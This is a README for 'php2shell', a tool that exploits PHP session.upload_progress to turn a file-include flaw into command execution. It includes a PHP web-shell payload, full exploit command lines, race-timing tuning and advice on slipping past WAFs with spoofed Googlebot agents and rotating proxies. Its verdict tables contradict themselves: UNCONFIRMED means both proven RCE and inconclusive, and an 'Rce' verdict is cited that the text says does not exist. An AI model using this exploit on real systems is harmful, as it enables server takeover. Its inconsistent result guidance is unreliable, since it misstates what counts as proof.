# `README.md`

```markdown
<div align="center">

```
+-------------------------------------------+
|  php2shell — session upload progress RCE  |
|  Authorized security testing only         |
+-------------------------------------------+

# php2shell

**PHP `session.upload_progress` → LFI → Remote Code Execution**

A single-binary exploit that turns a PHP file-include sink into command
execution by racing PHP's `session.upload_progress` feature.

**Authorized security testing only. Authorized security testing only.**

[![Rust](https://img.shields.io/badge/rust-1.70%2B-orange?logo=rust)](https://www.rust-lang.org/)
[![Version](https://img.shields.io/badge/version-0.4.0-blue)](#changelog)
[![License](https://img.shields.io/badge/license-MIT-green)](#license)
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows-lightgrey)](#installation)

</div>

---

## ⚠️ Legal notice — read this first

**This tool is for authorized security testing only.**

**This tool is for authorized security testing only.**

This tool is provided **strictly for**:

- Authorized penetration tests with **written permission**
- CTF environments
- Isolated lab research
- Educational study

This tool must **never** be run against systems you do not own or have
explicit written permission to test. Doing so is **illegal** in most
jurisdictions (CFAA in the US, Computer Misuse Act in the UK, similar laws
in the EU and elsewhere) and violates the terms of service of virtually every
hosting provider.

By using this tool you agree that **you alone** are responsible for your
actions. The author assumes **zero liability** for misuse, damage, legal
consequences, or any other outcome arising from the use of this software.

**If you are not authorized: close this page.**

**If you are not authorized: close this page.**

---

## Table of contents

- [What is php2shell?](#what-is-php2shell)
- [What php2shell is NOT](#what-php2shell-is-not)
- [How the technique works](#how-the-technique-works)
- [Requirements](#requirements)
- [Installation](#installation)
- [Full usage guide (step by step)](#full-usage-guide-step-by-step)
  - [Step 1: Recon the target](#step-1-recon-the-target)
  - [Step 2: Dry run](#step-2-dry-run)
  - [Step 3: First exploit attempt](#step-3-first-exploit-attempt)
  - [Step 4: Read the verdict](#step-4-read-the-verdict)
  - [Step 5: Prove command execution](#step-5-prove-command-execution)
  - [Step 6: Retries and tuning](#step-6-retries-and-tuning)
  - [Step 7: Save the report](#step-7-save-the-report)
- [Complete options reference](#complete-options-reference)
- [All verdicts explained](#all-verdicts-explained)
- [Worked example from scratch](#worked-example-from-scratch)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)
- [Limitations](#limitations)
- [Comparison with other tools](#comparison-with-other-tools)
- [JSON report format](#json-report-format)
- [Changelog](#changelog)
- [References](#references)
- [License](#license)

---

## What is php2shell?

**php2shell is a PHP session-upload-progress LFI-to-RCE exploit.**

**php2shell is a PHP session-upload-progress LFI-to-RCE exploit.**

It exploits a **race condition** in PHP's session handling to turn an
**arbitrary file-include (LFI)** into **remote code execution (RCE)**.

- It does **not** need any specific CVE.
- It does **not** need `allow_url_include`.
- It does **not** need to write a file you control to disk.
- It does **not** need any credentials.
- It **does** need `session.upload_progress.enabled = On` (PHP default).
- It **does** need an LFI sink.
- It **does** need a reachable session save path.

If you have an LFI, and the target runs PHP with default session settings,
php2shell can turn that LFI into RCE.

**If you have an LFI, and the target runs PHP, php2shell can turn that LFI
into RCE.** That is the entire point of the tool.

---

## What php2shell is NOT

- **It is NOT a CVE.** There is no CVE for this technique. It is a
  documented attack pattern that combines two PHP features working as
  designed (PHP 5.4+, 2011+). Do **not** attach a fabricated CVE ID to your
  report. If you need an advisory, cite the LFI in the application, not this
  tool.
- **It is NOT an LFI scanner.** It does not discover LFI sinks for you.
  You must supply `--lfi` with the path to the include you already found.
- **It is NOT an authenticated exploit.** The default SID is unauthenticated.
  If the upload endpoint is behind auth, you must pass `--sid` from a real
  session (see [Step 3](#step-3-first-exploit-attempt)).
- **It is NOT a blind exploit.** Without `--lfi`, php2shell can only prove
  the race succeeded (`UNCONFIRMED` verdict) — it cannot prove command
  execution without reading the response.
- **It is NOT a WAF bypass.** Aggressive WAFs will block the LFI requests.
  See [Troubleshooting](#troubleshooting) for tuning.

---

## How the technique works

### Short version

PHP's `session.upload_progress` feature writes user-controlled data into a
session file on disk **as soon as** it sees a multipart field named
`PHP_SESSION_UPLOAD_PROGRESS`. The file stays on disk **until the upload
finishes**. During that window, an LFI can include the file and execute
whatever PHP code the attacker injected.

**Poison a session file, stall the upload, include the file with LFI.
That is the entire technique.**

**Poison a session file, stall the upload, include the file with LFI.
That is the entire technique.**

### Detailed version — the race timeline

```
┌──────────────────────────────────────────────────────────────────────┐
│ Attacker                PHP-FPM                    Disk               │
├──────────────────────────────────────────────────────────────────────┤
│                                                                       │
│ 1. POST multipart  ──►  parses field value  ──►  writes sess_abc123   │
│    (payload in           (session.upload_progress)  to disk          │
│     progress field)                                                   │
│                                                                       │
│ 2. ── STALL ──           ...waiting...            file still exists   │
│    (upload not yet                                 (nothing has        │
│     finished)                                       deleted it)       │
│                                                                       │
│ 3. GET /lfi?file= ──►  include sess_abc123  ──►   RCE!                │
│      sess_abc123         (executes PHP)                               │
│                                                                       │
│ 4. finish upload  ──►  cleanup  ──►               file deleted        │
│                                                                       │
└──────────────────────────────────────────────────────────────────────┘
```

The key insight: **step 2 and step 3 happen at the same time.** The upload
is still open, the file is on disk, and the LFI is firing repeatedly. When
one of the LFI requests includes the file before cleanup runs, the injected
PHP executes.

**If you fire the LFI after the upload finishes, the file has already been
deleted and you get nothing.** This is the most common implementation bug in
public PoCs — this tool does it right.

**The LFI must fire DURING the stall, not after the upload.**
**The LFI must fire DURING the stall, not after the upload.**

### Why the payload goes in the progress-field value

The payload is placed in the **value** of the `PHP_SESSION_UPLOAD_PROGRESS`
field, not in the filename:

- **Filenames are sanitized differently** across PHP versions.
- **WAFs look for `<?php` in filenames**, but rarely in form values.
- **The value is what gets serialized into the session file** in every
  known PHP version.

**Payload in the value, not the filename.**
**Payload in the value, not the filename.**

### How proof of execution works

The payload is:

```php
<?php $m="PFMARK_XXXXXXXX"; echo $m; system($_GET['c']); echo $m; ?>
```

Execution requires the marker to appear **twice** in the response, with
**non-empty content between them**:

```
... PFLMARK_XXXXXXXX <command output> PFLMARK_XXXXXXXX ...
```

**Why two markers?** Because if PHP *didn't* execute the payload (e.g., the
LFI just dumped the file contents), you would see the marker exactly
**once**:

```
progress|s:60:"<?php $m="PFLMARK_XXXXXXXX"; ... ?>"; ...
```

One marker = file was read, not executed. Two markers = code executed and
the `system()` call in the middle produced output.

**Two markers, not one. Non-empty span between them.**
**Two markers, not one. Non-empty span between them.**

This is the guard against **reflection false positives** — the entire class
of "look, I can see my payload in the response" non-vulnerabilities.

---

## Requirements

### To run php2shell

- **Rust 1.70+** (only if building from source)
- A C toolchain (for `native-tls`)
- OpenSSL dev headers on Linux

### On the target

- **PHP 5.4 or newer** (session upload progress shipped in 5.4)
- **`session.upload_progress.enabled = On`** (PHP default)
- **An LFI sink** — a page that includes a user-controlled path
- **A reachable session save path** — `/var/lib/php/sessions`, `/tmp`,
  `/var/lib/php5`, or discoverable via phpinfo / config leak
- **Not behind auth**, OR you have a valid SID (see `--sid`)

---

## Installation

### From source (recommended)

```bash
git clone https://github.com/<your-org>/php2shell.git
cd php2shell
cargo build --release
sudo install -m 0755 target/release/php2shell /usr/local/bin/
```

Install build dependencies first:

```bash
# Debian / Ubuntu
sudo apt install -y build-essential pkg-config libssl-dev

# Fedora / RHEL
sudo dnf install -y gcc make openssl-devel

# Arch
sudo pacman -S --needed base-devel openssl

# macOS (Homebrew)
brew install openssl pkg-config
```

### Pre-built binaries

Releases page: <https://github.com/<your-org>/php2shell/releases>

| Platform | Binary |
|---|---|
| Linux x86_64 | `php2shell-<ver>-x86_64-unknown-linux-gnu` |
| Linux aarch64 | `php2shell-<ver>-aarch64-unknown-linux-gnu` |
| macOS x86_64 | `php2shell-<ver>-x86_64-apple-darwin` |
| macOS arm64 | `php2shell-<ver>-aarch64-apple-darwin` |
| Windows x86_64 | `php2shell-<ver>-x86_64-pc-windows-msvc.exe` |

### Verify installation

```bash
php2shell --version
php2shell --help
```

**If those two commands work, you are ready to proceed.**
**If those two commands work, you are ready to proceed.**

---

## Full usage guide (step by step)

This section walks you from "I have a target URL" to "I have a JSON report
that proves command execution."

**Follow the steps in order. Do not skip Step 2.**
**Follow the steps in order. Do not skip Step 2.**

### Step 1: Recon the target

Before you run php2shell, you need to know three things:

1. **Is the target PHP?**
2. **Is `session.upload_progress.enabled = On`?** (usually yes by default)
3. **What is the LFI sink?** — the URL and parameter

If you don't have an LFI yet, **stop here.** php2shell is not an LFI
scanner. Run `ffuf`, `feroxbuster`, or your LFI discovery tool of choice
first. You need an actual LFI sink URL like:

```
http://lab.local/download.php?file=/etc/passwd
```

Also try to determine the **session save path**. Common values:

- `/var/lib/php/sessions` — Debian/Ubuntu default
- `/var/lib/php5` — older Debian
- `/tmp` — many distros and containers
- `/var/lib/php/session` — some RHEL
- Application-specific paths

If you can leak `phpinfo()`, look for `session.save_path`. If not, try the
common paths.

**No LFI = no exploit. No LFI = no exploit.**
**No LFI = no exploit. No LFI = no exploit.**

### Step 2: Dry run

**Always dry-run first.** It shows exactly what will be sent, without
sending it.

```bash
php2shell --dry-run \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

You will see:

```
[dry-run] === Request line + headers ===
POST / HTTP/1.1
Host: lab.local
User-Agent: Mozilla/5.0 ...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
Content-Length: 2201
Cookie: PHPSESSID=...
Connection: close

[dry-run] === part1 (1420 bytes), then sleep 1.35s ===
[dry-run] === part2 (781 bytes) ===
[dry-run] === multipart body total: 2201 bytes ===
[dry-run] LFI URL: http://lab.local/download.php?file=/var/lib/php/sessions/sess_...&c=id
[dry-run] Would spawn 8 LFI workers during the stall (interval 100ms, max 5000 total)
```

**Check these before proceeding:**

- **Is the LFI URL correct?** Does it point at a real include sink?
- **Is the session path correct?** Does `/var/lib/php/sessions` match the
  target's config?
- **Is the POST path correct?** Default is the path from the target URL —
  is that where the upload should go?
- **Is `Cookie: PHPSESSID=...` set?** Yes, php2shell manages this
  automatically.

**Fix any incorrect values in the dry run before sending real traffic.**
**Fix any incorrect values in the dry run before sending real traffic.**

### Step 3: First exploit attempt

Once the dry run looks good, run the exploit for real:

```bash
php2shell -v \
    -c 'id' \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

**Understanding the `--lfi` template.** This is the most important flag.
The template must contain three substitution tokens:

| Token | Replaced with | Example |
|---|---|---|
| `%SID%` | URL-encoded PHPSESSID | `k3f9m2x8p1q7r4t6...` |
| `%CMD%` | URL-encoded command | `id` |
| `%PARAM%` | URL-encoded GET parameter name | `c` |

The template is *not* a literal URL — it's a template. `%SID%` is replaced
with the current session ID on every attempt. `%CMD%` is replaced with the
`--cmd` value. `%PARAM%` is replaced with the `--param` value (default `c`).

A typical template:

```
http://lab.local/view.php?page=/var/lib/php/sessions/sess_%SID%&c=%CMD%
```

After substitution this becomes:

```
http://lab.local/view.php?page=/var/lib/php/sessions/sess_k3f9m2x8...&c=id
```

The LFI includes the session file (which contains `system($_GET['c'])`),
and `c=id` runs `id` on the target.

**Template must contain `%SID%`, `%CMD%`, and `%PARAM%`.**
**Template must contain `%SID%`, `%CMD%`, and `%PARAM%`.**

If you omit `%SID%`, poisoning is unreachable. If you omit `%CMD%`, no
command is injected. If you omit `%PARAM%`, the parameter name doesn't
match the payload. The tool warns about all three in `notes`.

### Step 4: Read the verdict

After the run, look at the verdict block:

```
==============================================
  VERDICT:      UNCONFIRMED
  Target:       http://lab.local/
  SID:          k3f9m2x8p1q7r4t6v0y5w2z8n3
  Attempts:     1
  Output:       uid=33(www-data) gid=33(www-data) groups=33(www-data)
==============================================
```

**What each verdict means for what you do next:**

| Verdict | What it means | What to do |
|---|---|---|
| **`UNCONFIRMED`** | Command executed. You have proof. | Done. Save the report and move on. |
| **`UNCONFIRMED`** | Race succeeded, LFI fired, but no proof of execution | See [Troubleshooting](#troubleshooting) — usually session path, strict mode, or LFI path |
| **`NO_LFI`** | Race succeeded, but no `--lfi` supplied | Add `--lfi` and retry. **Not a "not vulnerable" result.** |
| **`HTTP_ERROR`** | 5xx / timeout / connection reset during race | Investigate — could be filter, crash, or transient. Retry once. |
| **`AUTH_REQUIRED`** | 3xx to login page | Upload endpoint needs auth — get a real SID and pass `--sid` |
| **`HTTP_ERROR`** | 3xx to non-login page | WAF or access gate — try `--lfi-workers 1 --lfi-interval 500` |
| **`UNKNOWN`** | Target not detected as PHP | Double-check the target URL |
| **`DryRun`** | `--dry-run` completed | Expected — nothing sent |
| **`Error`** | Fatal error | See error message in the report |

**`NO_LFI` is not `Patched`. `NO_LFI` is not "not vulnerable."**

`NO_LFI` means: *I succeeded at the race, but I have no way to verify
because you didn't supply an LFI. Run again with `--lfi`.*

If you see `NO_LFI` and file a "not vulnerable" report, **you have not
tested the target.** Always supply `--lfi`.

### Step 5: Prove command execution

Once you have `Rce`, run a **proof-of-impact** command — not just `id`:

```bash
php2shell -c 'id; hostname; whoami; uname -a; head -3 /etc/passwd' \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    -o proof.json \
    http://lab.local/
```

**Why the extra commands?**
- `id` — confirms user context (www-data, apache, nginx, etc.)
- `hostname` — confirms it's the right host
- `whoami` — cross-check
- `uname -a` — confirms OS/arch
- `head /etc/passwd` — confirms read access to sensitive files

**A report needs evidence, not just "the tool says UNCONFIRMED."**
**A report needs evidence, not just "the tool says UNCONFIRMED."**

The output in the verdict block and in `proof.json` is that evidence.
Paste it into your deliverable.

### Step 6: Retries and tuning

If the first attempt gives `UNCONFIRMED` (not `Rce`), try these in order:

**A. Increase retries.**

```bash
php2shell --retries 5 \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

Each retry gets a fresh random SID, fresh boundary, and fresh timing. Some
attempts succeed just due to luck in the race.

**B. Increase the stall.**

The default `--stall 1350` (ms) exceeds PHP's default `min_freq` of 1000ms
by 350ms. If the target is slow, this margin may be too tight.

```bash
php2shell --stall 2500 \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

**C. Increase LFI workers.**

More workers = more tries per stall = higher chance of a hit.

```bash
php2shell --lfi-workers 16 --lfi-interval 50 \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

**D. Try a different session path.**

If `/var/lib/php/sessions` is wrong, the LFI includes the wrong file. Try:

- `/tmp/sess_%SID%`
- `/var/lib/php5/sess_%SID%`
- `/var/lib/php/session/sess_%SID%`

```bash
php2shell --lfi 'http://lab.local/download.php?file=/tmp/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

**E. Try an authenticated SID.**

If the target has `session.use_strict_mode=1`, it regenerates unknown SIDs
and poisoning fails. Log in legitimately, extract the PHPSESSID cookie, and
pass it:

```bash
# Log in and grab the SID
curl -c cookies.txt -d 'user=admin&pass=admin' http://lab.local/login.php
SID=$(grep PHPSESSID cookies.txt | awk '{print $7}')

# Use it
php2shell --sid "$SID" \
    --cookie 'auth=1' \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

If the SID is regenerated (visible in `Set-Cookie`), the tool reports
`UNCONFIRMED` with a warning in `notes`.

### Step 7: Save the report

Always save a JSON report for your engagement record:

```bash
php2shell -v --retries 3 \
    -c 'id; hostname' \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    -o lab-$(date +%Y%m%d-%H%M%S).json \
    http://lab.local/
```

The JSON report contains:

- The **exact payload** transmitted (not a template)
- The **SID used**
- The **LFI template**
- The **command run**
- The **command output**
- The **verdict** and **notes**
- A **timestamp**

**Paste this report into your deliverable. It is your evidence.**
**Paste this report into your deliverable. It is your evidence.**

---

## Complete options reference

Every flag, what it does, and when to use it.

### Target & command

| Flag | Default | Description |
|---|---|---|
| `<TARGET>` | — | Base URL of the target (`http://` or `https://`). Path component used as default POST path. |
| `-c, --cmd <CMD>` | `id` | Command to execute on the target via `system()`. |
| `--param <NAME>` | `c` | GET parameter name for the command (`$_GET[<NAME>]`). Must match `%PARAM%` in the LFI template. |
| `--session-name <NAME>` | `PHPSESSID` | PHP `session.name` value. Only change if you know the target overrides it. |
| `--post-path <PATH>` | target path | Where to POST the throttled upload. Only change if uploads go to a specific endpoint. |

### Race tuning

| Flag | Default | Description |
|---|---|---|
| `-s, --stall <MS>` | `1350` | Milliseconds to stall between upload chunks. Must exceed `session.upload_progress.min_freq` (default `1000`). Increase for slow targets. |
| `--lfi-workers <N>` | `8` | Concurrent LFI requests during the stall. More = higher hit chance, but noisier. |
| `--lfi-interval <MS>` | `100` | Delay between LFI attempts per worker. Decrease for aggressive, increase for WAF evasion. |
| `--lfi-max-attempts <N>` | `5000` | Global cap on total LFI requests per attempt. Prevents runaway firing. |
| `--retries <N>` | `1` | Full end-to-end attempts. Fresh SID each attempt unless `--sid` given. |

### Session control

| Flag | Default | Description |
|---|---|---|
| `--sid <SID>` | random | Fixed PHPSESSID. **Required for authenticated targets.** Pass a SID from a real session. |
| `--sid-length <N>` | `26` | Length of the randomly generated SID. |
| `--sid-charset <SET>` | `5bit` | SID charset: `hex` (0-9a-f), `5bit` (0-9a-v, PHP default), `6bit` (0-9a-zA-Z,-). |
| `--progress-field <NAME>` | `PHP_SESSION_UPLOAD_PROGRESS` | Field name that triggers upload progress. Only change if the target has renamed it. |

### Request shaping

| Flag | Default | Description |
|---|---|---|
| `-A, --user-agent <UA>` | random | Custom User-Agent. Pool of 4 real browser UAs by default. |
| `--cookie <KV>` | — | Extra cookies. Session cookie is managed automatically. |
| `--header "K: V"` | — | Extra header, repeatable. `Cookie:` is automatically merged into `--cookie`. |
| `--proxy <URL>` | — | `http://` (all traffic) or `socks5://` (LFI only — race socket needs HTTP `CONNECT`). |
| `--timeout <SEC>` | `15` | Per-request timeout. |
| `-k, --insecure` | off | Skip TLS certificate verification (for self-signed targets). |

### Workflow

| Flag | Description |
|---|---|
| `--dry-run` | Print request shape and LFI URL, do not send any traffic. |
| `--skip-fingerprint` | Skip PHP detection. Useful when you already know the target. |
| `-v, --verbose` | Per-request logging. Shows race timeline, LFI worker status, timing. |
| `-o, --output <FILE>` | Write structured JSON report to `<FILE>`. |

---

## Verdicts

`classify()` evaluates in this order; the first matching row wins.

| # | Observation | Verdict |
|---|---|---|
| 1 | Transport error or timeout before a usable response | `UNKNOWN` |
| 2 | HTTP 429, or an exhausted rate-limit header | `RATE_LIMITED` |
| 3 | HTTP 401 | `AUTH_REQUIRED` |
| 4 | HTTP 3xx whose Location resolves same-origin to a login path | `AUTH_REQUIRED` |
| 5 | HTTP 3xx whose Location does not match a login gate | `HTTP_ERROR` |
| 6 | HTTP 5xx (including 503 with `Retry-After`) | `HTTP_ERROR` |
| 7 | Both markers present in the response body | `UNCONFIRMED` |
| 8 | LFI attempts > 0, no markers | `NO_LFI` |
| 9 | HTTP 2xx, no `--lfi` template supplied | `UNCONFIRMED` |
| 10 | Anything else | `UNKNOWN` |

`Retry-After` is recorded in the report (`retry_after`) and surfaced as a
note, but does not change the verdict. It signals a *requested delay* —
maintenance, overload, and gateway backoff all send it — not proof of
rate limiting.

`UNCONFIRMED` is an honest result when the evidence cannot distinguish
execution from reflection. Even non-empty output between markers is not
proof by itself. This build has no `CONFIRMED` / RCE verdict, and
`execution_confirmed` is `false` on every path.

---

## All verdicts explained

Nine possible verdicts, each with a specific meaning. **Learn them all.**
**Learn them all.**

| Verdict | Meaning | Severity | Next step |
|---|---|---|---|
| **`UNCONFIRMED`** | Command output observed bracketed by two markers in the LFI response | **Confirmed RCE** | Save report, done |
| **`UNCONFIRMED`** | Race succeeded and LFI fired, but no proof of execution | **Inconclusive** | See Troubleshooting |
| **`NO_LFI`** | Race succeeded, no `--lfi` supplied | **Untested** | Run again with `--lfi` |
| **`HTTP_ERROR`** | 5xx / timeout / connection reset during the race | **Needs investigation** | Retry once, then inspect |
| **`AUTH_REQUIRED`** | 3xx redirect to a login-looking path | **Blocked by auth** | Obtain a real SID, use `--sid` |
| **`HTTP_ERROR`** | 3xx redirect to a non-login path (WAF, CDN, gate) | **Blocked by filter** | Slow down with `--lfi-workers 1 --lfi-interval 500` |
| **`UNKNOWN`** | Target does not appear to be PHP | **Not applicable** | Double-check URL, skip fingerprint to force |
| **`DryRun`** | `--dry-run` completed | **N/A** | Expected — nothing sent |
| **`Error`** | Fatal orchestration error | **N/A** | See error message |

**This build has no `CONFIRMED` verdict. `UNCONFIRMED` is not a positive finding.**

`UNCONFIRMED`, `NO_LFI`, and `HTTP_ERROR` are **not** negative findings — they are
**inconclusive** findings. Do not report them as "not vulnerable." Report
them as "attempted, inconclusive, see notes."

---

## Worked example from scratch

Let's walk through a full engagement from zero to RCE report.

### Scenario

- Target: `http://lab.local/`
- Known LFI: `http://lab.local/download.php?file=/etc/passwd`
- Session path: Debian default `/var/lib/php/sessions`
- Auth: none

### Step 1 — Confirm the LFI

```bash
curl 'http://lab.local/download.php?file=/etc/passwd' | head -3
```

Expected output:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

**LFI confirmed.** Now convert the file path into the exploit template.

### Step 2 — Build the LFI template

Original LFI:

```
http://lab.local/download.php?file=/etc/passwd
```

Convert to template:

```
http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%
```

- Replaced `/etc/passwd` with `/var/lib/php/sessions/sess_%SID%` (session file path)
- Added `&c=%CMD%` (command parameter)

### Step 3 — Dry run

```bash
php2shell --dry-run \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

Inspect the output. Confirm the LFI URL is correct. **Only proceed if it looks right.**

### Step 4 — First attempt

```bash
php2shell -v \
    -c 'id' \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    http://lab.local/
```

If `Rce`:

```
==============================================
  VERDICT:      UNCONFIRMED
  Output:       uid=33(www-data) gid=33(www-data) groups=33(www-data)
==============================================
```

Done. Move to Step 5.

If `UNCONFIRMED`, move to Step 6 (Troubleshooting).

### Step 5 — Full proof

```bash
php2shell -v --retries 3 \
    -c 'id; hostname; uname -a; head -3 /etc/passwd' \
    --lfi 'http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%' \
    -o lab-engagement-2025.json \
    http://lab.local/
```

The `lab-engagement-2025.json` file now contains:

- Command output (proof)
- SID used
- Payload transmitted
- LFI template
- Timestamp
- Full verdict

**That JSON file is your deliverable evidence.**

### Step 6 — Troubleshooting (if needed)

If you got `UNCONFIRMED` at Step 4, try in order:

1. **Increase retries**: `--retries 5`
2. **Increase stall**: `--stall 2500`
3. **Increase workers**: `--lfi-workers 16`
4. **Try `/tmp` session path**: `--lfi '...file=/tmp/sess_%SID%&c=%CMD%'`
5. **Check verbose output** for `LFI ... -> 404` (wrong path) vs `-> 200` (right path, wrong content)
6. **Try authenticated SID** with `--sid` if target uses strict mode

**Repeat until both markers appear or you've exhausted all options.**

---

## Troubleshooting

### `UNCONFIRMED` verdict

Most common case. The race fired but didn't hit. Check in order:

**1. Was the LFI path correct?**

Look for `[w0] LFI ... -> 200` in `-v` output. If you see `-> 404`, the
path in your `--lfi` template is wrong (session file doesn't exist there, or
the parameter name is wrong).

**2. Was the session file path correct?**

Try alternatives:

```bash
--lfi 'http://lab.local/download.php?file=/tmp/sess_%SID%&c=%CMD%'
--lfi 'http://lab.local/download.php?file=/var/lib/php5/sess_%SID%&c=%CMD%'
--lfi 'http://lab.local/download.php?file=/var/lib/php/session/sess_%SID%&c=%CMD%'
```

**3. Was the SID regenerated?**

Look in `-v` output for `Server issued a different session id in Set-Cookie`.
If present, target has `session.use_strict_mode=1` — you need a real SID:

```bash
curl -c cookies.txt -d 'user=admin&pass=admin' http://lab.local/login.php
SID=$(grep PHPSESSID cookies.txt | awk '{print $7}')
php2shell --sid "$SID" --lfi '...' http://lab.local/
```

**4. Was the stall too short?**

PHP's `session.upload_progress.min_freq` is 1000ms by default. If your
`--stall` is below 1350ms and the target is slow, the progress file may
never be written before the LFI fires. Try `--stall 2500`.

**5. Is `serialize_handler=php_serialize`?**

If yes, the marker sits inside a serialized string and never executes. **Not
detected by php2shell.** Mitigation is heap grooming, out of scope. Check
`phpinfo()` or server config if accessible.

### `NO_LFI` verdict

You didn't supply `--lfi`. Run again with `--lfi`. **This is not a "not
vulnerable" result.** It is a "you didn't test" result.

### `AUTH_REQUIRED` verdict

The upload endpoint redirected to a login page. You need authentication.
Log in with the app first, extract the PHPSESSID, and pass `--sid`:

```bash
php2shell --sid 'real-session-id' --cookie 'auth=1' --lfi '...' http://lab.local/
```

### `HTTP_ERROR` verdict

> Applies to **both** 5xx/timeout/reset *and* non-login 3xx (WAF/gate/CDN).

WAF or access gate blocked the LFI. Slow down:

```bash
php2shell --lfi-workers 1 --lfi-interval 500 --lfi '...' http://lab.local/
```

If still blocked, try a different User-Agent:

```bash
php2shell -A 'Mozilla/5.0 (compatible; Googlebot/2.1)' --lfi '...' http://lab.local/
```


5xx, timeout, or connection reset during the race. Retry once:

```bash
php2shell --retries 2 --lfi '...' http://lab.local/
```

If it consistently crashes, investigate — could be a filter that crashes on
include, or a resource exhaustion. Report it as a separate finding.

### `UNKNOWN` verdict

Target doesn't appear to be PHP. Double-check the URL:

```bash
curl -I http://lab.local/ | grep -i 'x-powered-by\|server'
```

If it really is PHP but fingerprinting failed, skip it:

```bash
php2shell --skip-fingerprint --lfi '...' http://lab.local/
```

### Slow or hang

- Reduce `--timeout`: `--timeout 5`
- Reduce `--lfi-workers`: `--lfi-workers 4`
- Reduce `--lfi-max-attempts`: `--lfi-max-attempts 1000`

---

## FAQ

### Is this a CVE?

**No.** This is a technique that combines two PHP features working as
designed. There is no CVE for the technique itself. If your report needs a
CVE, cite the LFI in the application — not php2shell.

### Why does `--lfi` matter so much?

Because `UNCONFIRMED` alone proves *nothing* about whether the target is
vulnerable. The race can succeed against any PHP target with upload
progress enabled. Only the LFI proves the poisoning is *reachable* and
*executable*. **Without `--lfi`, you have not tested anything.**

**Without `--lfi`, you have not tested anything.**
**Without `--lfi`, you have not tested anything.**

### Why two markers instead of one?

Because a single marker can come from *reflection* — the target dumping the
session file contents without executing PHP. Two markers with non-empty
content between them proves `system()` ran. See [How proof works](#how-proof-of-execution-works).

### Why does the SID keep changing between attempts?

`--retries N` creates a fresh random SID each attempt (unless you pass
`--sid`). This is intentional — a fresh SID means a fresh session file,
which avoids one failed attempt poisoning the next.

### Why does `NO_LFI` exist?

Because reporting `NO_LFI` as "not vulnerable" is the #1 cause of false
negatives for this technique. `NO_LFI` is explicitly a *not tested* verdict,
not a *not vulnerable* verdict.

### Can I use this without an LFI?

No. php2shell needs an LFI sink. It is not an LFI scanner.

### Does this work against PHP 8?

Yes, if `session.upload_progress.enabled = On` (the default). PHP 8 did not
remove or disable the feature. This is a design decision, not a bug.

### Does this work against Docker containers?

Yes, if the session save path is reachable. Common Docker paths are `/tmp`,
`/var/lib/php/sessions`, and `/var/www/sessions`. Try all three.

### Does this work through Cloudflare?

Usually not — Cloudflare blocks `/var/lib/php/...` paths in query strings.
Try URL-encoding the path or use `--lfi-workers 1 --lfi-interval 2000` to
avoid triggering rate limits.

### Can I run this on Windows?

Yes, php2shell runs on Windows natively. But you may need to install
OpenSSL or use the pre-built binary. See [Installation](#installation).

---

## Limitations

### `session.serialize_handler=php_serialize`

If the target uses `php_serialize` (non-default but common in modern
frameworks), the marker sits inside a serialized string and never executes.
**Not detected by php2shell.** You will see `UNCONFIRMED` with no explanation.
Mitigation is heap grooming, which is out of scope.

### `session.use_strict_mode=1`

The server regenerates the SID because the one you supplied is unknown.
Poisoning silently fails. Detected and warned; the only fix is to pass a
real SID via `--sid`.

### `session.upload_progress.cleanup=Off`

This actually **helps** you — the poisoned file survives longer and the
race is trivially easy. The tool will hit on the first attempt.

### SOCKS5 proxy

Only wired through `reqwest`, so LFI requests go through the proxy. The raw
race socket requires HTTP `CONNECT`. If you need SOCKS5 on the race path,
that's a `tokio-socks` integration not currently implemented.

### No auto-LFI discovery

By design. Discovering LFI sinks automatically makes the tool noisy, slow,
and error-prone. Supply `--lfi` yourself — you should already know the sink
from prior recon.

### WAF / rate limiting

The LFI workers fire several requests per second per worker. Aggressive
WAFs will block the whole run. Tune `--lfi-workers 1 --lfi-interval 500` and
consider `--proxy` through a rotating pool.

---

## Comparison with other tools

| Tool | Technique | Concurrent LFI | Two-marker proof | Verdict taxonomy | JSON report |
|---|---|---|---|---|---|
| **php2shell** | session.upload_progress → LFI | ✅ | ✅ | ✅ 9 verdicts | ✅ |
| `php_filter_chain_generator` | filter chain → RCE | N/A (no race) | N/A | ❌ | ❌ |
| `lfimap` | many LFI techniques | ✅ | ❌ | ❌ | ⚠️ partial |
| `LFI Suite` | Python LFI scanner | ❌ | ❌ | ❌ | ❌ |
| `phpggc` | PHP object injection | N/A | N/A | N/A | N/A |

None of the above implements the two-marker proof or a verdict system that
distinguishes `NO_LFI` from `UNCONFIRMED` from `Rce`. That's the niche.

---

## JSON report format

Every run can emit a structured report with `-o report.json`:

```json
{
  "target": "http://lab.local/",
  "verdict": "UNCONFIRMED",
  "attempts": 2,
  "php_signal_detected": true,
  "php_version": "8.2.7",
  "sid": "k3f9m2x8p1q7r4t6v0y5w2z8n3",
  "sid_charset": "Default5",
  "session_name": "PHPSESSID",
  "stall_ms": 1350,
  "command": "echo PHP_TRANSPORT_PROBE_OK",
  "param": "c",
